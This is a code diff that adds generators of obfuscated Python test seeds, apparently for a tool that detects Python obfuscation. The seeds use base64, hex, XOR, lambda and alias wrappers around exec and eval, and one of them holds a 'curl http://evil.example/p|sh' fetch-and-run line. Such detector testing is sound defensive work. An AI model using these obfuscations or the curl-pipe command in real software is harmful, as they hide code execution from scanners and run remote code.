@@ -31,6 +31,16 @@ const PYTHON_TECHNIQUE_CATALOG = Object.freeze([
   'Python os.system Sink',
   'Python pty.spawn Shell-Upgrade',
   'Python Socket Reverse-Shell',
+  // ── Phase 3 additions ────────────────────────────────────────
+  'Python pickle.loads(b64)',
+  'Python lambda-wrapped exec',
+  'Python lambda-wrapped eval',
+  'Python lambda-wrapped compile',
+  'Python Aliased exec',
+  'Python Aliased eval',
+  'Python Aliased compile',
+  'Python bytes XOR List-Comp',
+  'Python bytes.fromhex().decode()',
 ]);
 
 function makeRng(seed) {
@@ -233,6 +243,120 @@ function genSocketReverseShell() {
   ];
 }
 
+// ── Phase 3 generators ─────────────────────────────────────────
+
+function _toBase64(str) {
+  return Buffer.from(str, 'utf8').toString('base64');
+}
+
+function genPickleLoads() {
+  // P7 — pickle.loads(base64.b64decode(...)). A genuine pickle stream
+  // starts with 0x80 (PROTO opcode) for proto>=2 or `(` (MARK) for
+  // proto 0/1. We emit a minimal PROTO-4 + NONE + STOP stream so the
+  // P7 first-byte gate fires.
+  const out = [];
+  // Proto-4 PROTO header + NONE + STOP ("\x80\x04N.").
+  const pickleBytes = Buffer.from([0x80, 0x04, 0x4e, 0x2e]);
+  const b64 = pickleBytes.toString('base64');
+  out.push(makeSeed(
+    `import pickle,base64\nexec(pickle.loads(base64.b64decode('${b64}')))`,
+    'pickle',
+  ));
+  // cPickle alias (Python 2 legacy path).
+  out.push(makeSeed(
+    `import cPickle,base64\ncPickle.loads(base64.b64decode(b'${b64}'))`,
+    'cPickle',
+  ));
+  return out;
+}
+
+function genLambdaWrappedExec() {
+  // P8a — (lambda s: exec(s))(payload) / (lambda: exec(payload))()
+  const out = [];
+  const b64 = _toBase64("import os; os.system('whoami')");
+  out.push(makeSeed(
+    `(lambda s: exec(s))(__import__('base64').b64decode('${b64}').decode())`,
+    'exec',
+  ));
+  out.push(makeSeed(
+    `(lambda: eval("__import__('os').system('id')"))()`,
+    'eval',
+  ));
+  out.push(makeSeed(
+    `(lambda _e: _e("print('pwned')"))(compile)`,
+    'compile',
+  ));
+  return out;
+}
+
+function genAliasedExec() {
+  // P8b — _e = exec; _e(payload)
+  const out = [];
+  out.push(makeSeed(
+    `_x = exec\n_x("import os; os.system('curl http://evil.example/p|sh')")`,
+    'exec',
+  ));
+  out.push(makeSeed(
+    `e_ = eval; e_("__import__('os').system('id')")`,
+    'eval',
+  ));
+  // Alias name that matches a dangerous builtin → MUST be suppressed
+  // (decoder rejects DANGEROUS_BUILTINS.has(alias)).
+  out.push(makeSeed(
+    `getattr = exec\nfoo = 1`,
+    '',
+  ));
+  return out;
+}
+
+function genBytesXorListComp() {
+  // P9 — bytes([b ^ 0x42 for b in b'...'])
+  // Python-specific SENSITIVE gate (python-obfuscation.js) does NOT
+  // include shell-LOLBin vocab like curl/wget — that's bash/cmd
+  // territory. Encode a Python-native sink so the decode passes
+  // the post-decode keyword gate.
+  const plaintext = 'os.system("id")';
+  const key = 0x42;
+  let hex = '';
+  for (let i = 0; i < plaintext.length; i++) {
+    hex += '\\x' + (plaintext.charCodeAt(i) ^ key).toString(16).padStart(2, '0');
+  }
+  const out = [];
+  out.push(makeSeed(
+    `bytes([b ^ 0x42 for b in b'${hex}'])`,
+    'os.system',
+  ));
+  // bytearray generator form with decimal key.
+  const plain2 = 'subprocess.call';
+  let hex2 = '';
+  for (let i = 0; i < plain2.length; i++) {
+    hex2 += '\\x' + (plain2.charCodeAt(i) ^ 66).toString(16).padStart(2, '0');
+  }
+  out.push(makeSeed(
+    `bytearray(c ^ 66 for c in b'${hex2}')`,
+    'subprocess',
+  ));
+  return out;
+}
+
+function genBytesFromHex() {
+  // P10 — exec(bytes.fromhex('…').decode())
+  const out = [];
+  const payload = "import os; os.system('whoami')";
+  const hex = Buffer.from(payload, 'utf8').toString('hex');
+  out.push(makeSeed(
+    `exec(bytes.fromhex('${hex}').decode())`,
+    'os.system',
+  ));
+  const payload2 = "subprocess.call(['curl','http://x'])";
+  const hex2 = Buffer.from(payload2, 'utf8').toString('hex');
+  out.push(makeSeed(
+    `eval(bytearray.fromhex('${hex2}').decode('utf-8'))`,
+    'subprocess',
+  ));
+  return out;
+}
+
 function generatePythonSeeds() {
   const rng = makeRng(0x70E17A00);
   void rng;
@@ -248,6 +372,11 @@ function generatePythonSeeds() {
     ...genOsSystemSink(),
     ...genPtySpawn(),
     ...genSocketReverseShell(),
+    ...genPickleLoads(),
+    ...genLambdaWrappedExec(),
+    ...genAliasedExec(),
+    ...genBytesXorListComp(),
+    ...genBytesFromHex(),
   ];
 }
 
